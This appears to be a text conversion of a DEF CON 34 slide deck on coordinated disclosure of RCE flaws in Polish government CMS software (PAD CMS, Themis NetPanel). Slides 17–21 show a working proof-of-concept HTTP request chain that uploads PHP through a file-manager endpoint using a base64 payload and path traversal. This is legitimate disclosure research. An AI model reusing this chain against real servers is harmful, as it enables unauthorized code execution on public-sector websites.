---
title: "Hacking the Government How Two Researchers Turned Late-Night Boredom Into a National Audit"
speakers: ["Robert Kruczek", "Kamil Szczurowski"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Robert Kruczek, Kamil Szczurowski - Hacking the Government How Two Researchers Turned Late-Night Boredom Into a National Audit - Hacking.pdf"
pages: 26
sha256: "b574ee911bd195e45c4828381afe0778668d845c063e25d96ea7499fe8f622b5"
text_chars: 9844
ocr_pages: 5
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:27:14Z"
---
# Hacking the Government How Two Researchers Turned Late-Night Boredom Into a National Audit

**Speakers:** Robert Kruczek, Kamil Szczurowski  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Robert Kruczek, Kamil Szczurowski - Hacking the Government How Two Researchers Turned Late-Night Boredom Into a National Audit - Hacking.pdf` (26 pages)

## Slide 1

# random_guys@DefCon 34:~# ./execute_presentation.sh **Hacking the Government**

[ SYSTEM STATUS & SCOPE
]
> MODE: ETHICAL HACKING
> TARGET: GOVERNMENT
> STATUS: EXPLOITED & 0WN3D

How Two Researchers Turned Late-Night Boredom Into a National Audit

## Slide 2

random_guys@DefCon 34:~# whois ProXy

# **Robert Kruczek**

- [ USER DETAILS ]

- AKA: ProXy

- BY DAY: Pentester @ Securitum.com (10 years)

- ROLE: Social engineering & Web & Desktop

- RESEARCH: Vulnerability researcher / CVE (49)

- AUTHOR: Book about Social Engineering

- WEBSITE:  kruczek.me

- LINKEDIN: linkedin.com/in/kruczek-robert

## Slide 3

random_guys@DefCon 34:~# whois Szczurowsky

# **Kamil Szczurowski**

- [ USER DETAILS ]

- AKA: Szczurowsky

- BY DAY: Pentester @ Securitum.com

- BY NIGHT: Vuln Researcher & Malware Analysis

- EVENTS: Speaker at some conferences

- WRITES: Articles, Pentest Chronicles, Public reports > STATUS: Has some CVE's

- LINKEDIN: linkedin.com/in/szczurowsky

## Slide 4

random_guys@DefCon 34:~# ./how_it_started.sh

# **How everything has started?**

> STEP: 01_NOTHING_ILLEGAL_HERE TOTALLY LEGAL THINGS

> STEP: 02_SIGHSEEING

SIGHTSEEING ANCIENT RUINS (OF OUR MENTAL STATE)

> STEP: 03_CASUAL_RIDE CRUISING IN THE NATIONAL PARK

## Slide 5

random_guys@DefCon 34:~# ./why_government.sh

## **And why precisely the government?**

> CONTEXT: GLOBAL

###### THE COMMON SPACE

> MOTIVATION: VALUES

###### PATRIOTISM

> ALLIANCE: TRUST

CERT POLSKA

Internet is a place that we’re all using, making its security critical for everyone.

A strong sense of duty to Great cooperation and protect our national digital coordinated vulnerability infrastructure and citizens. disclosure with national security teams.

**.**

## Slide 6

random_guys@DefCon 34:~# ./is_it_legal.sh

# **Is it even legal?**

> RULE_01: LEGALESE

#### **Article 269c of the Criminal Code**

The unlawful obtaining of information under § 2 of Article 267 or the disruption of the operation of an information system, an ICT system or an ICT network under Article 269a shall not be punishable as a criminal offence where a person acts solely for the purpose of securing an information system, a telecommunications and information technology system or a telecommunications and information technology network, or to develop a method for such security, and who immediately notified the administrator of that system or network of the identified threats, provided that their actions did not infringe upon the public or private interest and did not cause any damage.

## Slide 7

random_guys@DefCon 34:~# ./is_it_legal.sh

**Is it even legal?**

> RULE_02: SAFETY_FIRST

**DON'T DO IT AT HOME**

(unless you know what you are doing)

## Slide 8

random_guys@DefCon 34:~# ./execute.sh

**The Next Step...**

> SESSION: ESTABLISHED

**So let's go hack some government, shall we?**

> _

## Slide 9

random_guys@DefCon 34:~# ./audit_pad_cms.sh

# **PAD CMS Audit Findings**

> SYSTEM: PublicInformationBulletins_PORTALS

> AUDIT: VULNERABILITIES

##### **THE FRAMEWORK**

##### **SYSTEMIC RISKS**

The PAD CMS framework powers a significant portion of local government transparency portals in Poland. These systems host public records, structural data, and official communications.

During our audit, we identified systemic vulnerabilities across the platform, allowing for unauthorized data access and structural manipulation across hundreds of municipal endpoints.

**.**

## Slide 10

random_guys@DefCon 34:~# ./audit_pad_cms.sh --details **PAD CMS Vulnerabilities**

> AUDIT: REPORTED_VULNERABILITIES RCE EXPLOITS

> ALLIANCE: TRUST CREDITS

CVE-2025-7063: File upload permission bypass allows remote unauthenticated RCE. CVE-2025-7065: Photo upload permission bypass allows remote unauthenticated RCE. * Affects templates: www, bip, www+bip. EOL product - no patches.

Responsible disclosure by Kamil Szczurowski and Robert Kruczek. Other vulnerabilities found during CERT Polska's own research.

## Slide 11

random_guys@DefCon 34:~# php ./view_source.php

**PAD CMS Source**

> SOURCE_CODE: VULNERABILITY_ORIGIN

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
random_guys@DefCon 34:~# php ./view_source.php
PAD CMS Source
> SOURCE_CODE: VULNERABILITY_ORIGIN
1 = $_REQUEST['uploadPermission'];
if ($uploadPerm
```

## Slide 12

random_guys@DefCon 34:~# ./view_media_echo.sh

# **PAD CMS Media Echo**

> ECHO: GLOBAL_PUBLICATIONS

> ECHO: DOMESTIC_WARNINGS

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
random_guys@DefCon 34:~# ./view_media_echo.sh
PAD CMS Media
ee > ECHO: GLOBAL_PUBLICATIONS
Qyverscuumy system wy mmmcuatcry Wp UDMY FAL.
2 hours ago
1 Sekurak
Krytyczne podatnosci RCE w PAD CMS - zgtoszenie przez
ekspertow Securitum i analiza CERT Polska - konieczne
natychmiastowe dziatania
Naszych dwéch audytoréw bezpleczefistwa z Securitum — Robert Kruczek oraz Kamil
‘Szczurowski w ramach dziatah typu happy hunting (spontaniczne
1 day ago
& covpi
Rekomendacja Petnomocnika Rzadu ds.
Cyberbezpieczenstwa: zaprzestanie korzystania z
oprogramowania PAD CMS
Pefnomocnik Rzqdu ds. Cyberbezpieczeristwa Krzysztof Gawkowski zalecit podmiotom
krajowego systemu cyberbezpieczefistwa natychmiastowe wytaczenie z uzytku.
1 day ago
Echo
ee > ECHO: DOMESTIC_WARNINGS
1 day ago
@ wp
Gawkowski: oprogramowanie PAD CMS stanowi zagrozenie
dla bezpieczeristwa panstwa
Podmioty krajowego systemu cyberbezpieczeristwa powinny natychmiast przesta¢
uzywa¢ oprogramowania PAD CMS do zarzadzania stronami.
1 day ago
Polska Agencja Prasowa SA
Gawkowski: jedno z oprogramowan do zarzadzania
stronami internetowymi zagrozeniem dla bezpieczenstwa
panstwa
Podmioty krajowego systemu cyberbezpieczeristwa powinny natychmiast przestaé
uzywaé oprogramowania PAD CMS do bezplatnego zarzadzania.
1 day ago
1B) Spider's Web
```

## Slide 13

random_guys@DefCon 34:~# ./audit_doj_cms.sh

# **Second CMS: Dept. of Justice**

> RECON: DOM_SOURCE_AUDIT

**COURT WEBSITE VERIFICATION**

How an Ad invited us to verify DOM source of local Court website.

## Slide 14

random_guys@DefCon 34:~# ./audit_themis_panel.sh --target-courts

# **Themis NetPanel Vulnerability**

> AUDIT: CVE-2026-6847 (MISSING AUTHENTICATION)

> VISUAL: THEMIS_BLIND_JUSTICE

##### **RCE VIA UNRESTRICTED FILE UPLOAD**

Target: Utilized by over 200 Polish court websites.

Exploit: Endpoint permitted unauthenticated arbitrary base64 encoded PHP file uploads.

Impact: Two HTTP requests granted complete Remote Code Execution (RCE).

- Justice as Themis is Blind (and so is this court website + unauthenticated :D)

## Slide 15

random_guys@DefCon 34:~# ./cert_disclosure.sh --show-details

# **Themis NetPanel Disclosure**

> REPORT: CERT_POLSKA_COORDINATION

##### **VULNERABILITY OVERVIEW & PATCH STATUS**

Coordination: CERT Polska received a report about vulnerability in 4real Themis NETPanel and coordinated its disclosure.

Vulnerability: CVE-2026-6847 (Remote Code Execution due to missing authentication).

Exploit Path: Uploading arbitrary PHP files via base64-encoded payload to execute arbitrary code.

Resolution: This issue has been successfully fixed by a patch released in April 2026.

**.**

## Slide 16

random_guys@DefCon 34:~# ./execute_poc.sh

# **Themis NetPanel Disclosure**

> SOURCE_CODE: VULNERABILITY_ORIGIN

external_plugins: { "responsivefilemanager": "plugins/responsivefilemanager/plugin.min.js", "filemanager": "filemanager/plugin.min.js" },

## Slide 17

random_guys@DefCon 34:~# ./execute_poc.sh **Themis NetPanel Disclosure**

> SOURCE_CODE: VULNERABILITY_ORIGIN

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
random_guys@DefCon 34:~# ./execute_poc.sh
Themis NetPanel Disclosure
> SOURCE_CODE: VULNERABILITY_ORIGIN
GET /panel/layout/vendors/tinymce/filemanager/dialog.php?akey=[] HTTP/2
Host: vulnerable.host
```

## Slide 18

random_guys@DefCon 34:~# ./execute_poc.sh **Themis NetPanel Disclosure**

> SOURCE_CODE: VULNERABILITY_ORIGIN

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
random_guys@DefCon 34:~# ./execute_poc.sh
Themis NetPanel Disclosure
> SOURCE_CODE: VULNERABILITY_ORIGIN
HTTP/2 200 OK
Set-Cookie: PHPSESSID=2cs(...); path=/
eS
```

## Slide 19

random_guys@DefCon 34:~# ./execute_poc.sh

# **Themis NetPanel Disclosure**

## Slide 20

random_guys@DefCon 34:~# ./execute_poc.sh **Themis NetPanel Disclosure**

> SOURCE_CODE: VULNERABILITY_ORIGIN

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
random_guys@DefCon 34:~# ./execute_poc.sh
Themis NetPanel Disclosure
> SOURCE_CODE: VULNERABILITY_ORIGIN
POST
/panel/layout/vendors/tinymce/filemanager/ajax_calls.php?action=save_img
HTTP/2
Host: vulnerable.host
Cookie: last_position=%2F; PHPSESSID=2cs(...)
Content-Length: 78
X-Requested-With: XMLHttpRequest
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
url=data%3aimage/png%3bbase64 , PD9waHAgZWNobyAyKj171D8%2b&path=&name=. . /2x2.
php
```

## Slide 21

random_guys@DefCon 34:~# ./execute_poc.sh **Themis NetPanel Disclosure**

> RESULT…

**4**

**.**

## Slide 22

random_guys@DefCon 34:~# ./vulnerability_research.sh **Vulnerability Research: Ups & Downs**

> ERROR_REPORT: UNRESOLVED_ISSUES

[!] Unluckily, not all the reports are resolved that easily.

[!] We have a few cases where CVD process is still in progress for over a year.

[!] In some cases vendor intentionally tried to deny the vulnerability and basically do everything but fix the issue.

[!] Sometimes acknowledges the vulnerability and yet decides not to do anything.

## Slide 23

random_guys@DefCon 34:~# ./commonalities.sh **So what are the commonalities?**

> ANALYSIS: COMMONALITIES_FOUND

[!] Lack of norms regarding the software used in the government

[!] Vendors' approach to security & reported vulnerabilities

[!] Long Term Support (LTS) is not an obvious thing

[!] Lack of Bug Bounty initiatives

## Slide 24

random_guys@DefCon 34:~# ./research_summary.sh **Brief Summary of Our Research**

> RESEARCH: IMPACT_ASSESSMENT

**10,000+**

> CRITICAL_AREAS_AFFECTED

[!] Airports & Ports

[!] Affected Public Entities

**250,000+**

[!] Courts of Law [!] Municipal Offices [!] Hospitals & Healthcare

[!] Affected Websites

## Slide 25

random_guys@DefCon 34:~# ./conclusion.sh

### **Was everything worth a hassle?**

> VERDICT: SUMMARY_EVALUATION

**ABSOLUTELY.**

## Slide 26

**[ Thanks for your time <3]**

EOF: End of data stream

linkedin.com/in/szczurowsky kamil.szczurowski@securitum.pl

www.kruczek.me

www.securitum.com

linkedin.com/in/kruczek-robert

robert.kruczek@securitum.pl
